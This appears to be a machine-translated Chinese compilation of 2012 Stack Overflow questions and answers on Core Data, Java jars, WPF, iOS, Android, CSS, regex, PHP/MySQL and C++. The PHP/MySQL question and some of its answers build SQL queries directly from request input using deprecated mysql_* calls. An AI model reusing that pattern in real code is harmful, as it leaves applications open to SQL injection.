> ID：11603869
> 
> 赞同：2
> 
> 时间：2012-07-22T20:47:59.517
> 
> 标签：macos, cocoa, core-data

我正在尝试编写一个应用程序来访问和更改用户日历中的条目。这些更改由用户可以定义的相当复杂的规则驱动。

在我花太多时间开发之前，我的问题是我是否应该使用核心数据。很多模型将由核心数据处理，但我需要访问大量存储的信息然后对其进行更改。这会是核心数据的问题吗？

如果我对核心数据有更好的理解会有所帮助，但在这一点上我没有:(有人可以评论在使用核心数据时对模型数据执行更改的可能性吗？我不想待几个月进入开发，发现我做了错误的选择！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:55:37.553

使用 CoreData 进行模式更改并不比使用大多数其他数据框架更难。[CoreData 可以自行](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreDataVersioning/Articles/vmLightweightMigration.html#//apple_ref/doc/uid/TP40004399-CH4-SW1)处理对数据模型的许多简单更改。当它无法确定正确的事情时，[您可以编写自定义迁移](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreDataVersioning/Articles/vmLightweightMigration.html#//apple_ref/doc/uid/TP40004399-CH4-SW1)。

以我的经验，CoreData 通常使数据密集型应用程序更易于编写和维护，但在灵活性上的损失非常小，您通常不会错过。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T23:37:16.777

最近发布的[WWDC 媒体集](https://developer.apple.com/videos/)包含 2005 年的音频演示文稿，当时 Core Data 框架作为 OS X 框架的一部分发布。该演示文稿涵盖了 Core Data 的主要目标、设计原则和架构。它还讨论了一组示例应用程序（recipy 应用程序）。该系列可通过 iTunesU 获得。值得听听掌握框架的工作原理。

我已经使用 Core Data 有一段时间了。我发现它易于使用，很好地集成到 Xcode 中，稳定并且到目前为止一直是我工作效率的真正贡献者。它为您的数据提供了各种存储选项（二进制、XML - 在开发过程中非常容易使用 - 和 SQLite），非常好的工具支持，用于小更改的简单模型迁移，可用于重大模型更改的复杂迁移，需要额外的努力。

您必须意识到 Core Data 既不是 RDBMS 也不是 RDBMS 映射工具这一事实。它是一个对象图和持久性框架，这是另一回事。如果你忽略这个事实，Core Data 可能会给你带来性能损失。

# java - 创建 jar 文件并在命令提示符窗口中运行

> ID：11603875
> 
> 赞同：0
> 
> 时间：2012-07-22T20:48:41.580
> 
> 标签：java, jar

我已经创建了几个 jar 文件并在 cmd 中运行它们，但最近我无法创建新的......事实上，我制作了一个 jar 文件，但是当我在 cmd 中运行它时，会出现以下错误消息；

```
exception in thread "main" java.lang.NullPointerException
 at Sun.launcher.launcherhelper.getMainClassFromJar(Unknown Source) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:53:15.930

如果您想以 just 开头，您的 jar 必须在其清单中定义主类`java -jar myjar.jar`，否则您将需要以`java -cp myjar.jar com.example.Mainclass`.

# wpf - WPF ComboBox 绑定选定值

> ID：11603876
> 
> 赞同：0
> 
> 时间：2012-07-22T20:48:49.320
> 
> 标签：wpf, vb.net

我正在尝试使用以下数据格式进行绑定：

```
Public Structure ItemBase
    Property ID As String
    Property Description As String
End Structure

Namespace Classes
    Public Class StockEntityClass
        Implements INotifyPropertyChanged  
#Region "Property Variables"
        Property ID As String
        Property Namee As String
        Property Units As String
        Property ContactID As String
        Property SetCount As Integer
        Property VatOnMargin As Boolean
        Property Vat As Double
        Property Code As String
        Property _ContactNamee As String
#End Region

        Public Sub New()
            _IDValue = Now.ToString
            _NameeValue = ""
            _UnitsValue = "Pcs"
            _ContactIDValue = ""
            _SetCountValue = 0
            _VatOnMarginValue = False
            _VatValue = 14.5
            _CodeValue = ""
            _ContactNamee = ""
        End Sub    
    End Class
End Namespace 
```

在作为 Stock Entity 变量的 DataContext 的 wpf xaml 窗口中，我有一个绑定到 BindingList(of ItemBase) 的组合框，用户将选择一个 Item 和该 ItemID 以与 StockEntity.ContactID 关联。

以下是 xaml 代码：

```
<ComboBox Name="VendorsComboBox" Grid.Row="2" Grid.Column="1" VerticalAlignment="Center" DisplayMemberPath="Description" SelectedItem="{Binding Path=CustomerID}"/> 
```

以下是绑定代码：

```
Dim Stock As Classes.StockEntityClass
VendorsComboBox.ItemsSource = Contacts.DBAccessFunctions.Get_ContactsByType_BaseList(DataSource, "Vendor")
        StockEntityStack.DataContext = Stock 
```

StockEntityStack 包含 UI 部分，该部分是 datacontext 绑定到股票变量。您能否告诉我如何将 xaml 数据绑定到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T22:09:19.873

尝试这样的事情：

主窗口（XAML 文件）：

```
 <Window x:Class="MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
        <StackPanel>
            <ComboBox ItemsSource="{Binding MySource}" 
                      SelectedValue="{Binding ContactID}"
                      DisplayMemberPath="Description"
                      SelectedValuePath="ID"
                      Width="180" Height="25"
                      />

            <StackPanel Orientation="Horizontal" Margin="10" >
                <TextBlock Text="Selected ID:" />
                <TextBlock Text="{Binding ContactID}" />
            </StackPanel>
        </StackPanel>
    </Window> 
```

MainWindow（代码隐藏文件）：

```
Class MainWindow 
    Public Sub New()
        InitializeComponent()
        Me.DataContext = New MainViewModel()
    End Sub
End Class 
```

主视图模型文件：

```
 Imports System.ComponentModel

Public Class MainViewModel
    Implements INotifyPropertyChanged

#Region "Fields"
    Private _selectedContactID As String = String.Empty
#End Region

#Region "Property Variables"
    Property MySource As List(Of ItemBase) = New List(Of ItemBase)
    Public Property ContactID As String
        Get
            Return _selectedContactID
        End Get
        Set(ByVal value As String)
            _selectedContactID = value
            OnPropertyChanged("ContactID")
        End Set
    End Property
#End Region

    Public Sub New()
        MySource.Add(New ItemBase(1, "test1"))
        MySource.Add(New ItemBase(2, "test2"))
        MySource.Add(New ItemBase(3, "test3"))
        MySource.Add(New ItemBase(4, "test4"))
        MySource.Add(New ItemBase(5, "test5"))
    End Sub

    Public Event PropertyChanged As PropertyChangedEventHandler Implements INotifyPropertyChanged.PropertyChanged

    Protected Sub OnPropertyChanged(ByVal propertyName As String)
        RaiseEvent PropertyChanged(Me, New PropertyChangedEventArgs(propertyName))
    End Sub

End Class

Public Structure ItemBase
    Public Sub New( _
       ByVal _id As String,
       ByVal _description As String
       )
        ID = _id
        Description = _description
    End Sub
    Property ID As String
    Property Description As String
End Structure 
```

# objective-c - 相对于 Screen Estate 定位子视图

> ID：11603883
> 
> 赞同：0
> 
> 时间：2012-07-22T20:49:35.763
> 
> 标签：objective-c, ios, uiview

我想将多个小的 UIViews 显示为相对于屏幕资产的子视图。这应该适用于不同的屏幕尺寸（iPad、iPhone）/纵向/横向模式。

每个要显示的子视图都有两个 NSNumber 对象，其无符号整数范围从**-100**（最小值）到**100**（最大值），需要映射到正确的**x**和**y**坐标以进行定位。

*   **转换**这些值（-100...100）以使用它们在屏幕上定位 UIView的最佳方法是什么？
*   我如何以**相对**而不是绝对的方式定位它们，以便代码可以跨屏幕旋转和屏幕尺寸工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T01:15:33.577

好的，所以如果我理解正确，您希望 x 方向的 -100 映射到屏幕上最左边的点，x 方向的 100 映射到屏幕上最右边的点，y 方向的 -100 映射到屏幕上的最低点，并且 y 中的 100 映射到屏幕上的最高点（或者您可能希望 y 与我所拥有的相反，以便它与屏幕坐标系一致，其中 y 越大越低你得到的屏幕？）。我们还想考虑轮换。

据我了解，要求`UIScreen`它的`height`and `width`：

```
CGFloat width = [UIScreen mainScreen].bounds.size.width;
CGFloat height = [UIScreen mainScreen].bounds.size.height; 
```

但这并没有考虑到轮换。我知道的唯一另一种非常简单的方法是要求`UIView`覆盖屏幕它的`width`和`height`（最简单的，你可以让你的视图控制器的视图覆盖整个屏幕）。

如果您有一个`UIView`完美覆盖整个屏幕（我们称之为 myView），您可以尝试：

```
CGFloat width = myView.frame.size.width;
CGFloat height = myView.frame.size.height; 
```

`height`这些应该自己调整方向（根据我的经验，如果你得到and `width`in或之​​后的任何东西，它肯定会起作用`viewDidAppear:animated:`。还`UIView`需要是`UIViewController`s 视图属性或该视图的子视图。如果没有，你将拥有实施`didRotateFromInterfaceOrientation:`或找到其他方式来告诉您对任何旋转的看法）。一旦我们有了屏幕的“宽度”和“高度”，我们就可以将您的 int 转换为屏幕位置。尝试类似：

```
(CGPoint)convertX:(NSNumber *)x andY:(NSNumber *)y intoPoint
{
    pointX = ([x intValue] + 100.0)*width/200.0;
    pointY = (-[y intValue] + 100.0)*height/200.0; // remove the - sign at the front of the expression for y to grow as you move down the screen
    return CGPointMake(pointX, pointY);
} 
```

将 x 和 y 中的 -100 到 100 转换为屏幕上各自的点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T22:31:27.290

如果您使用 +/-100 的范围，那么您可能希望使用底层的 CALayers 来定位您的视图。CALayers 的优点在于，它们的锚点映射到与设备无关的网格，该网格在笛卡尔平面上的范围从 0.0 到 +1.0。

# android - 缺少 Android SDK

> ID：11603884
> 
> 赞同：0
> 
> 时间：2012-07-22T20:49:43.860
> 
> 标签：android

以下是我在 PC 中的当前设置。

Eclise Indigo Android SDK 平台 - API 15 ADT 版本 18

我开发了一个简单的安卓应用程序，并且能够在模拟器和安卓手机中成功启动它。我需要用银河平板模拟器进行测试。我在 Android SKD Manager 中找到了 GALAXY Tab Android API 8。当我选择安装时，系统会提示我一条消息“缺少 SDK 平台 Android，API 8”。我的问题是：

我在哪里可以下载 Android sdk api 8？api版本15和8可以共存吗？我可以在 Eclipse 中获得 api 8 版本的 etup 吗？如何将此版本作为 AVD Manager 中的目标之一？

请指教。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:26:57.123

通过开始菜单打开“SDK 管理器”，一旦 SDK 管理器已加载，选择“Android 2.2 (API 8)”包并单击右下角的“安装包”按钮。

如果您想通过 Eclipse 访问 SDK 管理器，请转到顶部的“窗口”选项卡，然后您应该会看到“Android SDK 管理器”选项，单击它并按照上述相同的步骤进行操作。

至于您的问题“api 版本 15 和 8 是否可以共存”，答案是肯定的。

# html - 不同输入类的css

> ID：11603887
> 
> 赞同：5
> 
> 时间：2012-07-22T20:50:29.757
> 
> 标签：html, css, class, error-handling, settings

你好我有以下问题：

我确实检查了我的表单中的一些 php 错误消息。

如果没有错误，我只是有我的 css 设置：

```
.wrapper #frame form fieldset ul input {
    color: #f23;
    font-size: 10px;
    height: 18px;
    padding-left: 5px;
    margin-top: 3px;
    outline:none;
} 
```

和我的焦点设置：

```
.wrapper #frame form fieldset ul input:focus{
    color:#fff;
    font-weight: bold;
    border: 2px solid #fff;
} 
```

好的，现在我改变了这一行：

```
<input type="text" id="normal" name="1" value=""/> 
```

添加错误类别：

```
<input class="err" type="text" id="normal" name="1" value=""/> 
```

问题是我的设置只发生在输入字段上的班级详细信息，而不是我的焦点设置：

```
.err {
    color: #444444;
    font-size: 10px;
    width: 180px;
    height: 18px;
    padding-left: 5px;
    outline:none;   
    background-image: url(../images/error.png);
}
.err input:focus{
    color:#f23;
    font-weight: bold;
    border: 2px solid #f23;
} 
```

因此，如果有人可以告诉我为什么这不起作用，我将不胜感激。多谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-07-22T20:52:31.597

您的 HTML 中有一个类`error`，并且在您的 CSS 中，您已将类设置为`err`; 如果您始终使用相同的名称（无论您选择哪个），它应该可以工作。

您*当前的*HTML：

```
<input class="error" type="text" id="normal" name="1" value=""/> 
```

...和CSS：

```
.err {
    color: #444444;
    font-size: 10px;
    width: 180px;
    height: 18px;
    padding-left: 5px;
    outline:none;   
    background-image: url(../images/error.png);
}
.err input:focus{
    color:#f23;
    font-weight: bold;
    border: 2px solid #f23;
} 
```

此外，在您的 CSS 中，您选择的`input`是具有类名的元素的后代`err`，而不是具有该类名*的*`input`元素。所以，你应该使用类似的东西：

 *```
<input class="err" type="text" id="normal" name="1" value=""/>

input.err {
    color: #444444;
    font-size: 10px;
    width: 180px;
    height: 18px;
    padding-left: 5px;
    outline:none;   
    background-image: url(../images/error.png);
}
input.err:focus{
    color:#f23;
    font-weight: bold;
    border: 2px solid #f23;
} 
```*

# regex - 用正则表达式替换雅虎管道中的 item.title

> ID：11603889
> 
> 赞同：0
> 
> 时间：2012-07-22T20:50:36.057
> 
> 标签：regex, yahoo-pipes

在 Yahoo Pipes 中，feed'items 的标题：

*   一些话 2012 年 1 月 23 日
*   一些话 2012 年 2 月 3 日 一些话
*   一些话 2012 年 7 月 4 日

我想用

*   2012 年 1 月 23 日
*   2012 年 2 月 3 日
*   2012 年 7 月 4 日

我使用正则表达式

将 item.title ^.+(\d{1,2}.+\d{4}) 替换为 $1

但我得到

*   2012 年 1 月 3 日
*   2012 年 2 月 3 日
*   2012 年 7 月 4 日

我不知道解决我的问题。如果有人可以帮助我。非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:56:11.140

看起来您的第一个 .+ 正在抓取第一个数字，因为您的捕获规则 \d{1,2} 表示抓取 1 或两个数字，而 .+ 可以抓取任何东西。更具体，并在匹配数字之前放置一个 \s+。

为什么不试试：

```
.+\s+(\d{1,2}\s+\S+\s+\d{4}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:00:18.920

尝试简化您的正则表达式，例如`\d{1,2}.+\d{4}`

# java - Start/Sus pend/Resume/Suspend ... 其他类调用的方法

> ID：11603891
> 
> 赞同：1
> 
> 时间：2012-07-22T20:51:01.953
> 
> 标签：java, multithreading, concurrency, concurrent-programming

我想实现一个 Anytime k-NN 分类器，但我找不到在特定时间内调用“classify(...)”方法的方法，暂停它，在方法暂停之前获取可用结果，恢复特定时间量的方法，暂停它，在方法暂停之前获取可用结果，等等......我使用数据结构来获取近似结果。当算法遍历数据结构时，它最终会遇到实际的训练数据向量。

```
public class AnytimeKNN{
 public int classify(queryPoint, k){
   class_label;
   1\. Assign an initial value to 'class_label'.
   2.while(not actual training data vectors are encountered){
     1\. traverse the data structure
     2\. assign a new value to 'class_label'
    }
  }
} 
```

我想通过以下方式从主方法调用“分类（..）”方法：

*   启动方法“分类（..）”
*   为“class_label”分配初始值时暂停方法“classify(..)”。
*   获取初始标签
*   继续执行“分类（..）”方法 X 时间
*   暂停方法“分类（..）”
*   获取新的“class_label”
*   恢复方法“分类（..）”X 时间量等......

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:09:33.873

听起来像是并发编程中典型的生产者-消费者场景。在 Java 中，您可以使用两个二进制信号量来解决这个问题。一个告诉分类器它应该运行，一个告诉主线程获得下一个结果。分类器等待它的信号量直到它被主线程触发。主线程的行为类似。

当然，还有其他选择，例如使用并发队列。分类器将其结果放入队列中，主线程将它们拉出，如果没有新结果则等待。这将是我最喜欢的解决方案，但也许您有理由希望以固定的时间间隔启动和停止该方法。

# php - 没有错误，但页面保持空白并传递变量

> ID：11603892
> 
> 赞同：0
> 
> 时间：2012-07-22T20:52:01.173
> 
> 标签：php, mysql, variables, global-variables, echo

我设置了一个小测试项目，因此当您单击狼的名字时，它会将它们带到我想用来个性化有关它们单击的狼的信息的页面。该页面名为 wolf.php。我正在尝试使用传递变量 $_GET 方法来为 URL 分配狼 id，即 www.testsite.com/wolf.php?id=1 但即使我没有收到错误，页面也不会显示任何内容。

这是主页（home.php）

```
<?php
$username = $_SESSION['username'];
$result = @mysql_query("SELECT * FROM wolves WHERE owner = '$username'");
while($wolf = mysql_fetch_array($result))
{
echo "<a href= wolf.php?id=$wolf[id]>$wolf[name]</a>";
};
?> 
```

单击此链接会将我带到 www.testsite.com/wolf.php?id=1（或任何 id）。在 wolf.php 我有这个：

```
<?php
$id = $_GET['id'];
$result = @mysql_query("SELECT name FROM wolves WHERE id = '$id'") or die("Error: no  
such wolf exists");
echo .$result['name'].
;
?> 
```

我不确定我哪里出错了，但这似乎不起作用。没有关于狼身份的信息出现。提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T20:53:57.723

在开发中打开错误报告，`error_reporting(E_ALL); ini_set('display_errors', 1);`以便您在代码中看到致命的语法错误。还建议从您的呼叫中删除`@`错误抑制运算符。`mysql_*()`

最后一行有语法问题。意外的`.`连接运算符：

```
// Wrong:
// Parse error: syntax error, unexpected '.'
echo .$result['name'].
;

// Should be:
echo $result['name']; 
```

接下来，您还没有从查询中获取一行：

```
// mysql_query() won't error if there are no rows found.  Instead you have to check mysql_num_rows()
$result = mysql_query("SELECT name FROM wolves WHERE id = '$id'") or die("Query error: " . mysql_error());
// Zero rows found, echo error message.
if (mysql_num_rows($result) < 1) {
  echo "No such wolf.";
}
else {
  // Row found, fetch and display.
  $row = mysql_fetch_assoc($result);
  echo $row['name'];
} 
```

请注意，此脚本对 SQL 注入开放。至少，调用`mysql_real_escape_string()`您的查询输入变量。

```
$id = mysql_real_escape_string($_GET['id']); 
```

最终，考虑使用 PDO 或 MySQLi 代替旧`mysql_*()`函数，因为它们支持准备好的语句，以提高手动转义变量的安全性。这些`mysql_*()`功能计划弃用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T21:13:13.153

首先需要获取结果行。

变体 1 - 关联数组（值可作为字段名称使用）

```
$result = mysql_fetch_assoc($result);
echo $result['name']; 
```

变体 2 - 枚举数组（按索引，从零开始）

```
$result = mysql_fetch_row($result);
echo $result[0]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:54:08.147

```
<?php
$username = $_SESSION['username'];
$result = @mysql_query("SELECT * FROM wolves WHERE owner = '$username'"); 
```

你一开始就忘记了`session_start();`。`$username`是 "" 并且 sql 可能返回 0 条记录。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-22T21:00:59.313

在您的第二个片段中，您不能将`$result`其视为数组；它是一个资源标识符。要获取数组，请执行以下操作：

```
$row = mysql_fetch_assoc($result);
echo $row['name']; 
```

另请阅读有关 SQL 注入漏洞的信息。

# c++ - 在“cout”语句中调用带有“cout”语句的函数

> ID：11603894
> 
> 赞同：18
> 
> 时间：2012-07-22T20:52:22.263
> 
> 标签：c++, function, cout

我在弄乱代码时遇到了这种相当模糊的行为，这是示例：

```
#include <iostream>

using namespace std;

int print(void);

int main(void)
{
    cout << "The Lucky " << print() << endl;     //This line
    return 0;
}

int print(void)
{
    cout << "No : ";
    return 3;
} 
```

在我的代码中，带有注释的语句`//This line`应该打印出来 `The Lucky No : 3`，而是打印出来`No : The Lucky 3`。是什么导致了这种行为？这是否与 C++ 标准有关，或者它的行为因一个编译器而异？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-22T21:01:42.660

未指定函数参数的评估顺序。您的行在编译器中看起来像这样：

```
operator<<(operator<<(operator<<(cout, "The Lucky "), print()), endl); 
```

语句中的主要调用是以 endl 作为参数的调用。未指定是先计算第二个参数 endl 还是先计算更大的子表达式：

```
operator<<(operator<<(cout, "The Lucky "), print()) 
```

并且分解那个，未指定`print()`是首先调用函数还是子表达式：

```
operator<<(cout, "The Lucky ") 
```

所以，回答你的问题：

> 是什么导致了这种行为？这是否与 C++ 标准有关，或者它的行为因一个编译器而异？

它可能因编译器而异。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T21:02:35.083

让我们`operator <<`简单地调用`operator`.

现在我们可以写

```
cout << "The Lucky" 
```

作为

```
operator(cout, "The Lucky") 
```

这个操作的结果是`cout`，并传递给next `<<`，所以我们可以这样写

```
operator(operator(cout, "The Lucky"), print() ) 
```

这是一个带有两个参数的函数调用，标准没有说明它们的评估顺序。

所以使用一些编译器你真的可能会得到

```
The Lucky No : 3 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-20T17:11:05.103

在我的编译器中 No: The Lucky 3 is the output.... 这意味着它的行为因编译器而异。

# objective-c - 使用 UIViewController 中的表将变量传递给详细视图控制器（不是 UITableViewController ！！）

> ID：11603904
> 
> 赞同：0
> 
> 时间：2012-07-22T20:53:37.567
> 
> 标签：objective-c, xcode, uitableview, uiviewcontroller, xcode4.3

我目前有 2 个视图控制器：`ViewController`和`DetailViewController`. 它们都不是表视图控制器，它们都只是视图控制器。但是，我确实有一张桌子，`ViewController`它在其他方面工作得很好。我想在`DetailViewController`选择单元格时选择/传递一个变量。

使用情节提要，我设置了一个从单元格到`DetailViewController`标识符的模态序列`toDetailView`。

我尝试使用此方法将我的变量（在此示例中称为`play`）从 VC 传递到 DVC（通过[http://developer.apple.com/library/ios/#samplecode/SimpleDrillDown/Listings/Classes_RootViewController_m.html#//apple_ref /doc/uid/DTS40007416-Classes_RootViewController_m-DontLinkElementID_10](http://developer.apple.com/library/ios/#samplecode/SimpleDrillDown/Listings/Classes_RootViewController_m.html#//apple_ref/doc/uid/DTS40007416-Classes_RootViewController_m-DontLinkElementID_10)）：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

    if ([[segue identifier] isEqualToString:@"toDetailView"]) {

        NSIndexPath *selectedRowIndex = [self.tableView indexPathForSelectedRow];
        DetailViewController *detailViewController = [segue destinationViewController];
        detailViewController.play = [dataController objectInListAtIndex:selectedRowIndex.row];
    }
} 
```

但是我得到一个错误：`Property 'tableView' not found on object type 'ViewController *'`。我认为这是因为它不是表视图控制器？我怎样才能解决这个问题？或者我可以使用另一种方法来使用 segue 和传递变量`(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:58:35.400

在 ViewController 上，创建一个像这样的新属性：

```
@property (nonatomic, assign) IBOutlet UITableView *tableView; 
```

而`synthesize`它。然后，在 Interface Builder 中，您应该能够将插座分配给您正在使用的 tableview。这应该可以解决问题

# iphone - 在按钮按下时访问 TabBarController

> ID：11603909
> 
> 赞同：0
> 
> 时间：2012-07-22T20:53:59.550
> 
> 标签：iphone, objective-c, ios, ios4, uitabbarcontroller

我以编程方式创建了一个带有视图等的 TabBarController。现在我想在按钮按下时显示这个 TabBarController。我怎么做？目前我以模态方式展示它，但它不起作用 - 引发 sigtrap 错误。

这是我的 TabBarController 代码

```
@implementation TabBarViewController

- (void) loadView
{
    HomeViewController * homeViewController = [[HomeViewController alloc]initWithNibName:@"HomeViewController" bundle:nil];

    UITabBarController *tabBarController = [[UITabBarController alloc] init];
tabBarController.view.frame = CGRectMake(0, 0, 320, 460);

   // Set each tab to show an appropriate view controller
   [tabBarController setViewControllers:[NSArray arrayWithObjects:homeViewController, homeViewController, nil]];
   [self.view addSubview:tabBarController.view];
   [homeViewController release];
   [tabBarController release];
} 
```

这是我从 mainViewController 的 Button Press 事件访问此 tabBarController 的代码 -

```
 - (IBAction)quickBrowse:(UIButton *)sender
{
    TabBarViewController * tabBarController = [[TabBarViewController alloc]init];
    [self presentModalViewController:tabBarController animated:YES];
    [tabBarController release];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T22:44:29.513

如果您不使用 IB 并且想要手动创建视图，则只应覆盖方法 loadView。当你这样做时，你**必须**将你的根视图分配给 UIViewController 的**视图**属性。

我相信在你的情况下你不需要重写这个方法，你可以使用 viewDidLoad 方法来创建你的 UITabBarController 并将它存储在一个变量中，所以当事件被调用时，你需要做的就是将变量传递给方法presentModalViewController：动画：

您的最终代码如下所示：

```
- (void) viewDidLoad
{
    [super viewDidLoad];

    HomeViewController * homeViewController = [[HomeViewController alloc]initWithNibName:@"HomeViewController" bundle:nil];

    // you can't pass the same view controller to more than one position in UITabBarController
    HomeViewController * homeViewController2 = [[HomeViewController alloc]initWithNibName:@"HomeViewController" bundle:nil];

    // local variable
    self.modalTabBarController = [[UITabBarController alloc] init];

   // Set each tab to show an appropriate view controller
   [self.modalTabBarController setViewControllers:[NSArray arrayWithObjects:homeViewController, homeViewController2, nil]];
}

- (void)viewDidUnload
{
    self.modalTabBarController = nil;
    [super viewDidUnload];
}

 - (IBAction)quickBrowse:(UIButton *)sender
{
    [self presentModalViewController:self.modalTabBarController animated:YES];
} 
```

# ruby-on-rails - 搜索我的链接的 Rails 功能

> ID：11603912
> 
> 赞同：0
> 
> 时间：2012-07-22T20:54:14.933
> 
> 标签：ruby-on-rails, ruby

我正在为正在建设中的网站制作一个工具，使链接构建更容易。这个网站是用 Ruby On Rails 编写的。现在我正在学习 RoR，我不知道是否要开始制作一个搜索外部站点的函数，该 URL 已保存，以检查我的 url 是否存在于该特定站点上。如果是 => 显示，如果不是：设置 URL 非活动

所以我的问题：

1.  我可以从我的应用程序中搜索网站吗？

2.  做这个的最好方式是什么？

3.  您多久运行一次这样的脚本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T08:16:50.650

听起来您正在尝试验证 URL 是否处于活动状态。

回答您的问题：

1.  是的，您可以向另一个 URL 发出 HTTP 请求。
2.  要发出 HTTP 请求，请查看 Nestful gem，或者您可以使用标准库中的 Net::HTTP。
3.  您没有提供有关您的要求的明确信息，因此很难说什么是正确的，但是您可以在作者提交表单时运行检查。如果您担心响应缓慢，请使用 delayed_job 使检查异步。

# servicestack - FluentValidation.MVC 与 ServiceStack.FluentValidation.Mvc3

> ID：11603915
> 
> 赞同：1
> 
> 时间：2012-07-22T20:54:42.780
> 
> 标签：servicestack, fluentvalidation

[http://fluentvalidation.codeplex.com/wikipage?title=mvc](http://fluentvalidation.codeplex.com/wikipage?title=mvc)

对比

[http://www.servicestack.net/](http://www.servicestack.net/)

两者都有一个似乎具有相同类的库。

实际上，两者都是完全不同的库。

有人能告诉我为什么 servicestack 像 codeplex 一样有一个 fluentvalidation 程序集吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T22:22:00.873

在[Validation Wiki 页面](https://github.com/ServiceStack/ServiceStack/wiki/Validation)中描述- [ServiceStack](http://www.servicestack.net)包括一个 Fluent Validation 库的端口，具有自以为是的集成，因此它可以与 ServiceStack 的错误/验证模型、请求方法过滤器和自定义错误响应一起使用。

与[ServiceStack 的 MVC Mini Profiler 端口](https://github.com/ServiceStack/ServiceStack/wiki/Built-in-profiling)一样- 如果不修改源代码以与 ServiceStack 的管道一起使用，深度集成是不可能的。

# android - 当我将字符串传递给另一个活动时，android应用程序崩溃

> ID：11603916
> 
> 赞同：0
> 
> 时间：2012-07-22T20:54:42.937
> 
> 标签：android, android-activity

所以这是我遇到的另一个基本问题......当我尝试将字符串传递给另一个活动时，我的应用程序崩溃了。我尝试了几种方法，但徒劳无功。这是代码

名为 Main.java 的主要活动

```
package com.ammad.test;

import android.os.Bundle;
import android.os.Handler;
import android.app.Activity;
import android.content.Intent;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class Main extends Activity {

    TextView tv;
    Button b1;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tv = (TextView) findViewById(R.id.tvShow);
        b1 = (Button) findViewById(R.id.bt1);
        b1.setOnClickListener(new View.OnClickListener() {

            public void onClick(View arg0) {
                // TODO Auto-generated method stub
                Bundle basket = new Bundle();
                String myScore = "testing";
                basket.putString("key", myScore);
                Intent intent = new Intent(Main.this, Second.class);
                intent.putExtras(basket);
                startActivity(intent);

            }
        });

    }
} 
```

数据传递到的第二个类，名为 Second.java

```
package com.ammad.test;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class Second extends Activity{

    TextView tv;
    String getScore;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second);
        tv= (TextView) findViewById(R.id.tvRes);
        Bundle gotBasket = getIntent().getExtras();
        getScore = gotBasket.getString("key");
        tv.setText(getScore);
    }

} 
```

最后是清单文件：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ammad.test"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".Main"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity
            android:name=".Sec"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="com.ammad.test.SECS" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:03:15.687

在我看来，您的第二个活动在清单中被宣布为错误，因为 .Sec 而不是 .Second 正如预期的那样 - 日志可能显示异常，因为意图无效。

# c# - 点击事件和点击项目

> ID：11603917
> 
> 赞同：1
> 
> 时间：2012-07-22T20:55:02.917
> 
> 标签：c#, silverlight, windows-phone-7

我有一个来自 Toolkit 的多选 ListBox，我想在新页面中显示被点击的项目。
如何从点击的项目中提取每个项目？每个项目有 4 个字段。

这是填充 ListBox 的代码：

```
void client_DownloadStringCompleted(object sender, 
                                    DownloadStringCompletedEventArgs e)
{         
    if (e.Error == null)
    {
        string xml = e.Result;
        XDocument data = XDocument.Parse(xml);
        var persons = from query in data.Descendants("Table")
        select new MailList
        {
            Sender = (string)query.Element("FromUser"),
            Body = (string)query.Element("Message"),
            Date = ((DateTime)query.Element("mDate")).ToString("MM/yy"),
            Time = (string)query.Element("mTime"),
        };
         EmailList.ItemsSource = persons;
    }
} 
```

我想将 Sender 和 Body 字段发送到另一个页面。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:55:39.003

它非常简单......

在另一页上，创建一个名为 SelectedMailingList 的公共静态变量，类型为 MailingList。

